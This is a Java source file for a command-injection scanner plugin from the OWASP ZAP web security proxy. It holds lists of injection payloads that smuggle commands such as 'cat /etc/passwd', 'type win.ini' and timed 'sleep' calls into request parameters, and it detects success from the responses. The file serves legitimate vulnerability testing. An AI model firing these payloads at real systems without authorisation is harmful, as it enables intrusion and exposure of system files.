/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for -the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrules;

import java.io.IOException;
import java.text.MessageFormat;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.apache.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.model.Vulnerabilities;
import org.zaproxy.zap.model.Vulnerability;

/**
 * Active Plugin for Command Injection testing and verification.
 * https://www.owasp.org/index.php/Command_Injection
 * 
 * @author yhawke (2013)
 */
public class CommandInjectionPlugin extends AbstractAppParamPlugin {

    // *NIX OS Command constants
    private static final String  NIX_TEST_CMD = "cat /etc/passwd";    
    private static final Pattern NIX_CTRL_PATTERN = Pattern.compile("root:.:0:0"); 
    // Dot used to match 'x' or '!' (used in AIX)
    
    // Windows OS Command constants
    private static final String  WIN_TEST_CMD = "type %SYSTEMROOT%\\win.ini";
    private static final Pattern WIN_CTRL_PATTERN = Pattern.compile("\\[fonts\\]");
    
    // Useful if space char isn't allowed by filters
    // http://www.blackhatlibrary.net/Command_Injection
    private static final String BASH_SPACE_REPLACEMENT = "${IFS}";
    
    // OS Command payloads for command Injection testing
    private static final Map<String, Pattern> OS_PAYLOADS = new LinkedHashMap();
    static {
        // No quote payloads
        OS_PAYLOADS.put("&" + NIX_TEST_CMD + "&", NIX_CTRL_PATTERN);
        OS_PAYLOADS.put(";" + NIX_TEST_CMD + ";", NIX_CTRL_PATTERN);
        OS_PAYLOADS.put("&" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        OS_PAYLOADS.put("|" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        
        // Double quote payloads
        OS_PAYLOADS.put("\"&" + NIX_TEST_CMD + "&\"", NIX_CTRL_PATTERN);
        OS_PAYLOADS.put("\";" + NIX_TEST_CMD + ";\"", NIX_CTRL_PATTERN);
        OS_PAYLOADS.put("\"&" + WIN_TEST_CMD + "&\"", WIN_CTRL_PATTERN);
        OS_PAYLOADS.put("\"|" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        // Single quote payloads
        OS_PAYLOADS.put("'&" + NIX_TEST_CMD + "&'", NIX_CTRL_PATTERN);
        OS_PAYLOADS.put("';" + NIX_TEST_CMD + ";'", NIX_CTRL_PATTERN);
        OS_PAYLOADS.put("'&" + WIN_TEST_CMD + "&'", WIN_CTRL_PATTERN);
        OS_PAYLOADS.put("'|" + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        
        // Special payloads   
        OS_PAYLOADS.put("\n" + NIX_TEST_CMD + "\n", NIX_CTRL_PATTERN);  //force enter
        OS_PAYLOADS.put("`" + NIX_TEST_CMD + "`", NIX_CTRL_PATTERN);    //backtick execution
        OS_PAYLOADS.put("||" + NIX_TEST_CMD, NIX_CTRL_PATTERN);         //or control concatenation
        OS_PAYLOADS.put("&&" + NIX_TEST_CMD, NIX_CTRL_PATTERN);         //and control concatenation
        OS_PAYLOADS.put("|" + NIX_TEST_CMD + "#", NIX_CTRL_PATTERN);    //pipe & comment
        // FoxPro for running os commands
        OS_PAYLOADS.put("run " + WIN_TEST_CMD, WIN_CTRL_PATTERN);
        
        //Used for *nix
        //OS_PAYLOADS.put("\"|\"ld", null);
        //OS_PAYLOADS.put("'|'ld", null);
    };

    // Coefficient used for a time-based query delay checking (must be >= 7)
    private static final int TIME_STDEV_COEFF = 7;
    // Time used in sleep command [sec]
    private static final int TIME_SLEEP_SEC = 5;    
    // Standard deviation limit in milliseconds (long requests deviate from a correct model)
    public static final double WARN_TIME_STDEV = 0.5 * 1000;
    
    // *NIX Blind OS Command constants
    private static final String  NIX_BLIND_TEST_CMD = "sleep {0}s";
    // Windows Blind OS Command constants
    private static final String  WIN_BLIND_TEST_CMD = "timeout /T {0}";
    
    // OS Command payloads for blind command Injection testing
    private static final List<String> BLIND_OS_PAYLOADS = new LinkedList();
    static {
        // No quote payloads
        BLIND_OS_PAYLOADS.add("&" + NIX_BLIND_TEST_CMD + "&");
        BLIND_OS_PAYLOADS.add(";" + NIX_BLIND_TEST_CMD + ";");
        BLIND_OS_PAYLOADS.add("&" + WIN_BLIND_TEST_CMD);
        BLIND_OS_PAYLOADS.add("|" + WIN_BLIND_TEST_CMD);
        
        // Double quote payloads
        BLIND_OS_PAYLOADS.add("\"&" + NIX_BLIND_TEST_CMD + "&\"");
        BLIND_OS_PAYLOADS.add("\";" + NIX_BLIND_TEST_CMD + ";\"");
        BLIND_OS_PAYLOADS.add("\"&" + WIN_BLIND_TEST_CMD + "&\"");
        BLIND_OS_PAYLOADS.add("\"|" + WIN_BLIND_TEST_CMD);
        // Single quote payloads
        BLIND_OS_PAYLOADS.add("'&" + NIX_BLIND_TEST_CMD + "&'");
        BLIND_OS_PAYLOADS.add("';" + NIX_BLIND_TEST_CMD + ";'");
        BLIND_OS_PAYLOADS.add("'&" + WIN_BLIND_TEST_CMD + "&'");
        BLIND_OS_PAYLOADS.add("'|" + WIN_BLIND_TEST_CMD);
        
        // Special payloads   
        BLIND_OS_PAYLOADS.add("\n" + NIX_BLIND_TEST_CMD + "\n");  //force enter
        BLIND_OS_PAYLOADS.add("`" + NIX_BLIND_TEST_CMD + "`");    //backtick execution
        BLIND_OS_PAYLOADS.add("||" + NIX_BLIND_TEST_CMD);         //or control concatenation
        BLIND_OS_PAYLOADS.add("&&" + NIX_BLIND_TEST_CMD);         //and control concatenation
        BLIND_OS_PAYLOADS.add("|" + NIX_BLIND_TEST_CMD + "#");    //pipe & comment
        // FoxPro for running os commands
        BLIND_OS_PAYLOADS.add("run " + WIN_BLIND_TEST_CMD);
    };
                
    // Logger instance
    private static final Logger log 
            = Logger.getLogger(CommandInjectionPlugin.class);

    // Get WASC Vulnerability description
    private static final Vulnerability vuln 
            = Vulnerabilities.getVulnerability("wasc_31");

    /**
     * Get the unique identifier of this plugin
     * @return this plugin identifier
     */
    @Override
    public int getId() {
        return 90020;
    }

    /**
     * Get the name of this plugin
     * @return the plugin name
     */
    @Override
    public String getName() {
        return Constant.messages.getString("ascanrules.cmdinjection.name");
    }
    
    /**
     * Give back specific pugin dependancies (none for this)
     * @return the list of plugins that need to be executed before
     */
    @Override
    public String[] getDependency() {
        return new String[]{};
    }

    /**
     * Get the description of the vulnerbaility when found
     * @return the vulnerability description
     */
    @Override
    public String getDescription() {
        return Constant.messages.getString("ascanrules.cmdinjection.desc");
    }

    /**
     * Give back the categorization of the vulnerability 
     * checked by this plugin (it's an injection category for CODEi)
     * @return a category from the Category enum list 
     */    
    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    /**
     * Give back a general solution for the found vulnerability
     * @return the solution that can be put in place
     */
    @Override
    public String getSolution() {
        if (vuln != null) {
            return vuln.getSolution();
        }
        
        return "Failed to load vulnerability solution from file";    
    }

    /**
     * Reports all links and documentation which refers to this vulnerability
     * @return a string based list of references
     */
    @Override
    public String getReference() {
        return "http://cwe.mitre.org/data/definitions/78.html\n"
                + "https://www.owasp.org/index.php/Command_Injection";
    }

    /**
     * http://cwe.mitre.org/data/definitions/78.html
     * @return the official CWE id
     */
    @Override
    public int getCweId() {
        return 78;
    }

    /**
     * http://projects.webappsec.org/w/page/13246950/OS%20Commanding
     * @return the official WASC id
     */
    @Override
    public int getWascId() {
        return 31;
    }

    /**
     * Give back the risk associated to this vulnerability (high)
     * @return the risk according to the Alert enum
     */
    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }    

    /**
     * Initialize the plugin according to
     * the overall environment configuration
     */
    @Override
    public void init() {
        // do nothing
    }

    /**
     * Scan for OS Command Injection Vulnerabilites
     * 
     * @param msg a request only copy of the original message (the response isn't copied)
     * @param paramName the parameter name that need to be exploited
     * @param value the original parameter value
     */
    @Override
    public void scan(HttpMessage msg, String paramName, String value) {

        // Begin plugin execution
        if (log.isDebugEnabled()) {
            log.debug("Checking [" + msg.getRequestHeader().getMethod() + "][" 
                    + msg.getRequestHeader().getURI() 
                    + "], parameter [" + paramName 
                    + "] for OS Command Injection vulnerabilites");
        }
        
        // Number of targets to try
        int targetCount = 0;
        int blindTargetCount = 0;

        switch (this.getAttackStrength()) {
            case LOW:
                // This works out as a total of 4+4 reqs / param
                // Probably blind should be enabled only starting from MEDIUM (TBE)
                targetCount = 4;
                blindTargetCount = 4;
                break;

            case MEDIUM:
                // This works out as a total of 12+12 reqs / param
                targetCount = 12;
                blindTargetCount = 12;
                break;

            case HIGH:
            case INSANE:
                // This works out as a total of 18+18 reqs / param
                targetCount = OS_PAYLOADS.size();
                blindTargetCount = BLIND_OS_PAYLOADS.size();
                break;

            default:
            // Default to off
        }
        
        // Start testing OS Command Injection patterns
        // ------------------------------------------
        String payload;
        String paramValue;
        Iterator<String> it = OS_PAYLOADS.keySet().iterator();
        List<Long> responseTimes = new ArrayList<>(targetCount);
        long elapsedTime;
        
        // -----------------------------------------------
        // Check 1: Feedback based OS Command Injection
        // -----------------------------------------------
        // try execution check sending a specific payload
        // and verifying if it returns back the output inside
        // the response content
        // -----------------------------------------------
        for(int i = 0; it.hasNext() && (i < targetCount); i++) {

            msg = getNewMsg();
            payload = it.next();
            paramValue = value + payload;
            setParameter(msg, paramName, paramValue);

            if (log.isDebugEnabled()) {
                log.debug("Testing [" + paramName + "] = [" + paramValue + "]");
            }
            
            try {                
                // Send the request and retrieve the response
                sendAndReceive(msg, false);
                elapsedTime = msg.getTimeElapsedMillis();
                responseTimes.add(elapsedTime);
                                
                // Check if the injected content has been evaluated and printed
                String content = msg.getResponseBody().toString();
                Matcher matcher = OS_PAYLOADS.get(payload).matcher(content);
                if (matcher.find()) {
                    // We Found IT!                    
                    // First do logging
                    log.info("[OS Command Injection Found] on parameter [" + paramName + "] with value [" + paramValue + "]");
                    
                    // Now create the alert message
                    this.bingo(
                            Alert.RISK_HIGH, 
                            //Set this to Alert.CONFIRMED when changing to 2.4.0
                            Alert.WARNING,
                            null,
                            paramName,
                            paramValue, 
                            null,
                            matcher.group(),
                            msg);

                    // All done. No need to look for vulnerabilities on subsequent 
                    // payloads on the same request (to reduce performance impact)
                    return;                 
                }

            } catch (IOException ex) {
                //Do not try to internationalise this.. we need an error message in any event..
                //if it's in English, it's still better than not having it at all.
                log.error("Command Injection vulnerability check failed for parameter ["
                    + paramName + "] and payload [" + payload + "] due to an I/O error", ex);
            }
            
            // Check if the scan has been stopped
            // if yes dispose resources and exit
            if (isStop()) {
                // Dispose all resources
                // Exit the plugin
                return;
            }
        }
        
        // -----------------------------------------------
        // Check 2: Time-based Blind OS Command Injection
        // -----------------------------------------------
        // Check for a sleep shell execution according to
        // the previous experimented request time execution
        // It uses deviations and average for the real delay checking...
        // 7? =	99.9999999997440% of the values
        // so response time should be less than 7*stdev([normal response times])
        // Math reference: http://www.answers.com/topic/standard-deviation
        // -----------------------------------------------
        double deviation = getResponseTimeDeviation(responseTimes);
        double lowerLimit = (deviation >= 0) ? getResponseTimeAverage(responseTimes) + TIME_STDEV_COEFF * deviation : TIME_SLEEP_SEC * 1000;

        it = BLIND_OS_PAYLOADS.iterator();
        
        for(int i = 0; it.hasNext() && (i < blindTargetCount); i++) {
            msg = getNewMsg();
            payload = it.next();
            
            paramValue = value + MessageFormat.format(payload, TIME_SLEEP_SEC);
            setParameter(msg, paramName, paramValue);

            if (log.isDebugEnabled()) {
                log.debug("Testing [" + paramName + "] = [" + paramValue + "]");
            }
            
            try {                
                // Send the request and retrieve the response
                sendAndReceive(msg, false);
                elapsedTime = msg.getTimeElapsedMillis();

                // Check if enough time has passed                            
                if (elapsedTime >= lowerLimit) {

                    // Probably we've to confirm it launching again the query
                    // But we arise the alert directly with MEDIUM Confidence...
                    
                    // We Found IT!                    
                    // First do logging
                    log.info("[Blind OS Command Injection Found] on parameter [" + paramName + "] with value [" + paramValue + "]");
                    
                    // Now create the alert message
                    this.bingo(
                            Alert.RISK_HIGH, 
                            //Set this to Alert.MEDIUM when changing to 2.4.0
                            Alert.WARNING,
                            null,
                            paramName,
                            paramValue, 
                            null,
                            null,
                            msg);

                    // All done. No need to look for vulnerabilities on subsequent 
                    // payloads on the same request (to reduce performance impact)
                    return;           
                }

            } catch (IOException ex) {
                //Do not try to internationalise this.. we need an error message in any event..
                //if it's in English, it's still better than not having it at all.
                log.error("Blind Command Injection vulnerability check failed for parameter ["
                    + paramName + "] and payload [" + payload + "] due to an I/O error", ex);
            }
            
            // Check if the scan has been stopped
            // if yes dispose resources and exit
            if (isStop()) {
                // Dispose all resources
                // Exit the plugin
                return;
            }
            
        }
    }

    /**
     * Computes standard deviation of the responseTimes Reference:
     * http://www.goldb.org/corestats.html
     *
     * @return the current responseTimes deviation
     */
    private static double getResponseTimeDeviation(List<Long> responseTimes) {
        // Cannot calculate a deviation with less than
        // two response time values
        if (responseTimes.size() < 2) {
            return -1;
        }

        double avg = getResponseTimeAverage(responseTimes);
        double result = 0;
        for (long value : responseTimes) {
            result += Math.pow(value - avg, 2);
        }

        result = Math.sqrt(result / (responseTimes.size() - 1));

        // Check if there is too much deviation
        if (result > WARN_TIME_STDEV) {
            log.warn("There is considerable lagging "
                    + "in connection response(s) which gives a standard deviation of " 
                    + result + "ms on the sample set which is more than " 
                    + WARN_TIME_STDEV + "ms");
        }

        return result;
    }

    /**
     * Computes the arithmetic mean of the responseTimes
     *
     * @return the current responseTimes mean
     */
    private static double getResponseTimeAverage(List<Long> responseTimes) {
        double result = 0;
        
        if (responseTimes.isEmpty())
            return result;
        
        for (long value : responseTimes) {
            result += value;
        }

        return result / responseTimes.size();
    }

}
